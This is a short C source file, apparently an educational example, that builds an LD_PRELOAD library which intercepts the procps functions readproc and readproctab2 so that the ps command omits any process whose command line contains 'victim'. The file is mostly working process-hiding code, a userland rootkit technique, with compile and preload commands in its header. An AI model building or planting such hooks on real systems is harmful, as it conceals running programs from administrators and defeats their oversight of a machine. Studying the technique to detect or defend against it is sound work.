/* ---------------------------------------------------------------------------
 * libhijk-ps.c - Written by Manuel Gebele (m.gebele‹ατ›tuta.io)
 * 
 * A basic example of how to hijack readproc and readproctab2 to coax ps
 * to not show a particular process in its process listing.
 * 
 * TODO: Implement readproctab3 as well.
 * 
 * Inspired by the book "Practical Binary Analysis" by Dennis Andriesse.
 * 
 * Sample Session:
 * $ gcc -o libhijk-ps.so -fPIC -shared -D_GNU_SOURCE libhijk-ps.c
 * $ LD_PRELOAD=`pwd`/libhijk-ps.so ps a
 * $ LD_PRELOAD=`pwd`/libhijk-ps.so ps f (invokes readproctab2)
 * ---------------------------------------------------------------------------
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <proc/readproc.h>

/* The name of the process which should be hidden */
static const char *proc_name = "victim";

#define PID_MAX 32768

proc_t *tab[PID_MAX];

proc_t * (* orig_readproc)(PROCTAB * __restrict const, proc_t * __restrict);
proc_data_t * (* orig_readproctab2)(int(*)(proc_t *),
    int(*)(proc_t *), PROCTAB *__restrict const);

int
is_target_process(proc_t *proc)
{
    char *cmd;

    if (NULL == proc->cmdline) {
        cmd = proc->cmd;
    } else {
        cmd = *(proc->cmdline);
    }

    /* Note: This does of course also match processes named
     * foo|proc_name, proc_name|bar, and foo|proc_name|bar.
     */
    if (NULL != strstr(cmd, proc_name)) {
        return 1;
    }
 
    return 0;
}

proc_t *
readproc(PROCTAB *__restrict const PT, proc_t *__restrict p)
{
    proc_t *retval;

    if (NULL == orig_readproc) {
        orig_readproc = dlsym(RTLD_NEXT, "readproc");
    }

    /* Use a loop to ensure that we catch all subsequent processes */
    while (NULL != (retval = orig_readproc(PT, p))) {
        if (is_target_process(retval)) {
            /* Found process! Invoke another readproc call... */
            continue;
        }

        /* Process not found. Leave... */
        break;
    }

    return retval;
}

proc_data_t *
readproctab2(int(*want_proc)(proc_t *buf), int(*want_task)(proc_t *buf),
    PROCTAB *__restrict const PT)
{
    proc_data_t *retval;
    proc_t *proc;
    int proc_cnt;
    int index;

    if (NULL == orig_readproctab2) {
        orig_readproctab2 = dlsym(RTLD_NEXT, "readproctab2");
    }

    proc_cnt = 0;
    index = 0;
    retval = orig_readproctab2(want_proc, want_task, PT);
    for (int i = 0; i < retval->n; i++) {
        proc = retval->tab[i];
        if (is_target_process(proc)) {
            /* Found process! Ignore this entry... */
            proc_cnt++;
            continue;
        }

        /* Process not found. Collect this entry... */
        index = i - proc_cnt;
        if (index >= PID_MAX) {
            /* TODO: Prevent overflows! Not tested yet! */
            index = PID_MAX - 1;
        }
        
        tab[index] = proc;
    }

    retval->n -= proc_cnt;
    retval->tab = tab;

    return retval;
}
